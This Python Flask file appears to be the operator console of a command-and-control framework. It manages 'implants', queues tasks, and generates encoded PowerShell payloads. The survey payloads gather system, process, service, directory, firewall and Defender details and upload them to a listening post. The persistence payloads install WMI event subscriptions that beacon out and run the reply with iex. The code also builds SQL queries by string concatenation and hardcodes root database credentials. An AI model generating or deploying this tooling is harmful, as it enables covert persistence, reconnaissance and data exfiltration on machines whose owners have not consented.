#!/usr/bin/python3

from flask import Flask,render_template,request, redirect,url_for,flash
import time
from base64 import b64encode
import MySQLdb


app = Flask(__name__)
app.secret_key = "1234"


#Configure database connection
hostname = 'localhost'
username = 'root'
password = 't00r'
database = 'powerbeacon'
myConnection = MySQLdb.connect( host=hostname, user=username, passwd=password, db=database )




@app.route('/',methods=['GET','POST'])
def index():
    return redirect(url_for('implants'))

@app.route('/surveyGen',methods=['GET','POST']) #Auto generate a host survey, returns data to server, requires PS 3.0+
def surveyGen():
    error=None

    if request.method=='POST':          #If POST
        UUID=request.form['UUID']       #Grab Vars
        LP=request.form['LP']
        port=request.form['port']
#       key='0000'                      #We will get the key later
        notes=request.form['notes']
        mp_pref, ssl, systeminfo, netstat, ps, svc, dir, dir_c, dir_windows, dir_system32, dir_programfiles, dir_x86, netsh, firewall, firewall_rules = (False,)*15
        
        #These are redundent and I should optomize this part better.  Why IF here and then IF again later.  Unneeded
        if "ssl" in request.form:
            ssl=True
        if "systeminfo" in request.form:
            systeminfo=True
        if "netstat" in request.form:
            netstat=True
        if "ps" in request.form:
            ps=True
        if "svc" in request.form:
            svc=True
        if "dir_c" in request.form:
            dir_c=True
        if "dir_windows" in request.form:
            dir_windows=True
        if "dir_system32" in request.form:
            dir_system32=True
        if "dir_programfiles" in request.form:
            dir_programfiles=True
        if "dir_x86" in request.form:
            dir_x86=True
        if "netsh" in request.form:
            netsh=True
        if "firewall" in request.form:
            firewall=True
        if "mp_pref" in request.form:
            mp_pref=True
        if "firewall_rules" in request.form:     #this returns to many resuts for the return and isn't implemented below
            firewall_rules=True
        
        cur = myConnection.cursor()
        get_key=cur.execute("SELECT implantkey from implants where (UUID='" + UUID + "')")
        get_key = cur.fetchall()
        if len(get_key) < 1:
           error="UUID Not Found"
           return render_template('surveyGen.html',error=error)
        key=get_key[0][0]   
        task = "$message=''\n"
        task = "$message='Hostname: "
        task = "$message=(hostname)\n"
        if systeminfo:
            task = task+"$message+= (systeminfo) | Out-String\n"
        if ps:
            task = task+"$message+= (get-process | select-object id, name, path) | Out-String\n"
        if svc:
            task = task+"$message+= (get-service) | Out-String\n"
        if dir_c:
            task = task+"$message+= (get-childitem c:\) | Out-String\n"
        if dir_windows:
            task = task+"$message+= (get-childitem c:\windows) | Out-String\n"
        if dir_system32:
            task = task+"$message+= (get-childitem c:\windows\system32) | Out-String\n"
        if dir_programfiles:
            task = task+"$message+= (get-childitem \"c:\program files\") | Out-String\n"
        if dir_x86:
            task = task+"$message+= (get-childitem \"c:\program files (x86)\") | Out-String\n"
        if netsh:
            task = task+"$message+= \"PortProxy Settings:\"\n"
            task = task+"$message+= (netsh interface portproxy show all) | Out-String\n"
        if firewall:
            task = task+"$message+= (get-netconnectionprofile) | Out-String\n"
            task = task+"$message+= (get-netfirewallprofile) | Out-String\n"
        if mp_pref:
            task = task+"$message+= (get-mppreference) | Out-String\n"
#        if firewall_rules:
#            task = task+"$message+= (get-netfirewallrule -all) | Out-String\n"
        
        address=LP + ":" + port
        task=task+ "$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n"
        if ssl:
            task=task+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object Net.Webclient).UploadString('https://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '%s'  }\")" % (address,UUID,key,notes)
        else:
            task=task+"(New-Object Net.Webclient).UploadString('http://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '%s'  }\")" % (address,UUID,key,notes)
            print(task)

        encodedtask = b64encode(task.encode('UTF-16LE')).decode('UTF-8')
        encodedtask = "powershell -e " + encodedtask
        cur = myConnection.cursor()
        cur.execute("INSERT INTO tasks (UUID,task,notes) VALUES (%s,%s,%s)",(UUID,encodedtask,notes))
        myConnection.commit()
        cur.close()
        flash('Task added')
        return redirect(url_for('tasks')) 
    return render_template('surveyGen.html',error=error)

@app.route('/showCompleted',methods=['GET','POST'])
def showCompleted():
    error = None
    try:
        cur = myConnection.cursor()
        tasks = cur.execute("SELECT id,UUID,notes,time_complete FROM tasks where (is_complete=1) order by id desc")
        taskDetails = cur.fetchall()
        return render_template('completedtasks.html',taskDetails=taskDetails,error=error)
    except:
        error="An unknown error occured"
        return render_template('implants.html',error=error)
    myConnection.close()

@app.route('/deleteTask',methods=['GET','POST'])
def deleteTask():
    error = None
    if request.method=="POST":
        try:
            id=request.form['ID']
            cur = myConnection.cursor()
            cur.execute("delete from tasks where (id="+id+")")
            myConnection.commit()
            flash('Task Deleted')
            return redirect(url_for('tasks'))
        except:
            error = "An error has occured.  Possible duplicated UUID"
            return redirect(url_for('tasks'))
    return redirect(url_for('tasks'))
    myConnection.close()

@app.route('/getData',methods=['GET','POST'])
def getData():
    error = None
    if request.method == 'POST':
        id=request.form['ID']
        cur = myConnection.cursor()
        cur.execute("SELECT data from datastore where (id="+id+")")
        dataDetails=cur.fetchall()
        cur.close()
        #print(results[0])
        return render_template('getData.html',error=error,dataDetails=dataDetails)

    cur = myConnection.cursor()
    cur.execute("SELECT id,UUID,delivered,details from datastore order by delivered desc limit 100")
    dataDetails=cur.fetchall()
    cur.close()
    return render_template('showData.html',error=error,dataDetails=dataDetails) 

@app.route('/updatenotes',methods=['POST'])
def updatenotes():
    error = None
    if request.method == "POST":
        UUID = request.form['UUID']
        notes = request.form['notes']
        try:
           cur = myConnection.cursor()
           cur.execute("update implants set notes='"+ notes + "' where (UUID='" + UUID + "')")
           myConnection.commit()
           flash("Notes Updated")
           return redirect(url_for('implants'))
        except:
            return redirect(url_for('implants'))
    myConnection.close()
@app.route('/deleteImplant', methods=['POST'])
def deleteImplant():
    error = None
    if request.method == "POST":
        UUID1 = request.form['UUID1']
        UUID2 = request.form['UUID2']
        if UUID2==UUID1:
            cur = myConnection.cursor()
            cur.execute("delete from implants where UUID='" + UUID1 + "'")
            myConnection.commit()
            flash("Implant " + UUID1 + " deleted from database")
            return redirect(url_for('implants'))
        else:
            flash("UUID does not match.")
            flash("Implant not deleted.")
            return redirect(url_for('implants'))
    myConnection.close()
@app.route('/tasks',methods=['GET','POST'])
def tasks():
    error = None
    if request.method == 'POST':
        UUID = request.form['UUID']
        task = request.form['task']
        notes = request.form['notes']

        try:
            cur = myConnection.cursor()
            cur.execute("INSERT INTO tasks (UUID,task,notes) VALUES (%s,%s,%s)",(UUID,task,notes))
            myConnection.commit()
            cur.close()
            flash('Task added')
            return redirect(url_for('tasks')) 
        except:
            error = "UUID NOT FOUND" 
    cur = myConnection.cursor()
    myConnection.commit()
    tasks = cur.execute("SELECT id,UUID,notes FROM tasks where is_complete = 0")
    taskDetails = cur.fetchall()
    cur.close()
    return render_template('tasks.html',taskDetails=taskDetails,error=error)

@app.route('/implants',methods=['GET','POST'])
def implants():
    error=None
    if  request.method == 'POST':
        cur = myConnection.cursor()
        UUID = request.form['UUID']
        singleImplant = cur.execute("select * from implants where UUID='" + UUID +"'")
        singleImplant = cur.fetchall()
        implants = cur.execute("select * from checkins where UUID='" + UUID + "' order by last_checkin desc limit 100")
        implantDetails = cur.fetchall()
        return render_template('singleimplant.html',implantDetails=implantDetails,singleImplant=singleImplant,error=error)
    cur = myConnection.cursor()
    implants = cur.execute("select * from implants")
    implantDetails = cur.fetchall()
    return render_template('implants.html',implantDetails=implantDetails,error=error)
    myConnection.close()

@app.route('/addimplant',methods=['GET','POST'])
def addimplant():
    error=None
    
    if request.method == 'POST':
        try:
            UUID = request.form['UUID']  #getvariables
            key = request.form['key']
            notes = request.form['notes']
            import traceback
            cur = myConnection.cursor()#add to the database
            cur.execute("INSERT INTO implants (UUID,implantkey,notes) VALUES (%s,%s,%s)",(UUID,key,notes))
            cur.execute("INSERT INTO checkins (UUID) VALUES ('" + UUID + "')")
            cur.execute("update checkins set last_checkin='1990-01-01 00:00:00' where (UUID='" + UUID + "')")
            myConnection.commit()
            flash('Implant Added')   #It's been added
            cur.close()
            return redirect(url_for('implants'))
        except:
            error = "An error has occured.  Possible duplicated UUID"
            return render_template('addimplant.html',error=error)

    return render_template('addimplant.html',error=error)
    myConnection.close()

@app.route('/generateinstall',methods=['GET','POST'])
def generateinstall():
    error=None
    
    if request.method == 'POST':
        try:
            UUID = request.form['UUID']  #getvariables
            key = request.form['key']
            interval=request.form['interval']
            ip=request.form['ip']
            port=request.form['port']
            filter=request.form['filter']
            consumer=request.form['consumer']
            interval=int(interval)
            try:
                use_ssl = request.form['ssl']
                use_ssl = True
            except:
                use_ssl = False
            if (interval < 0) or (interval > 5): 
                error = 'Invalid Interval Selected'
                return render_template('addimplant.html',error=error)
            if interval==1:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0\""
            if interval==2:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=15 OR TargetInstance.Minute=30 OR TargetInstance.Minute=45) AND TargetInstance.Second=0\""
            if interval==3:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=30) AND TargetInstance.Second=0\""
            if interval==4:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1) AND TargetInstance.Second=0\""
            if interval==5:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Hour=0 OR TargetInstance.Hour=4 OR TargetInstance.Hour=8 OR TargetInstance.Hour=12 OR TargetInstance.Hour=16 OR TargetInstance.Hour=20) AND TargetInstance.Minute=1 AND TargetInstance.Second=0\""
            if interval==0:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\""

            address=ip + ":" + port
            if use_ssl:
                messageblock="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.Webclient).UploadString('https://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\")" % (address,UUID,key)
                encodedmessage = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8')
                messageblock="\"powershell -e %s \"" % (encodedmessage)
            else:
                messageblock="\"powershell -command `\"iex(New-Object Net.Webclient).UploadString('http://%s', \`\"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\`\")`\"\"" % (address,UUID,key)
            data='''
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance();
$instanceFilter.QueryLanguage = "WQL";
%s;
$instanceFilter.Name = "%s";
$instanceFilter.EventNamespace = 'root\cimv2';
$result = $instanceFilter.Put();
$newFilter = $result.Path;
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance();
$instanceConsumer.Name = '%s' ;
$instanceConsumer.CommandLineTemplate  = %s;
$result = $instanceConsumer.Put();
$newConsumer = $result.Path;
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance();
$instanceBinding.Filter = $newFilter;
$instanceBinding.Consumer = $newConsumer;
$result = $instanceBinding.Put();
$newBinding = $result.Path

''' % (interval_setting,filter,consumer,messageblock)

            remove_data= '''
$x="\\\.\\root\subscription:__EventFilter.Name='%s'"
([wmi]$x).Delete()
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='%s'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"%s\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"%s\\""'
([wmi]$x).Delete()
''' % (filter,consumer,consumer,filter)

            data = b64encode(data.encode('UTF-16LE')).decode('UTF-8')
            remove_data = b64encode(remove_data.encode('UTF-16LE')).decode('UTF-8')
            flash('Update String Generated')   #It's been added
            flash('UUID: '+ UUID)   #It's been added
            flash('Key: '+ key)   #It's been added
            flash('Server IP: '+ address)   #It's been added
            flash('Filter: '+ filter)   #It's been added
            flash('Consumer: '+ consumer)   #It's been added
            flash('Invterval: '+ str(interval))   #It's been added
            return render_template('generateinstall.html',data=data,remove_data=remove_data)
        except:
            error = "An error has occured."
            return render_template('generateinstall.html',error=error,data=data,remove_data=remove_data)

    return render_template('generateinstall.html',error=error)

if __name__ == "__main__":
    app.run(host='0.0.0.0',port=5000,debug=True)
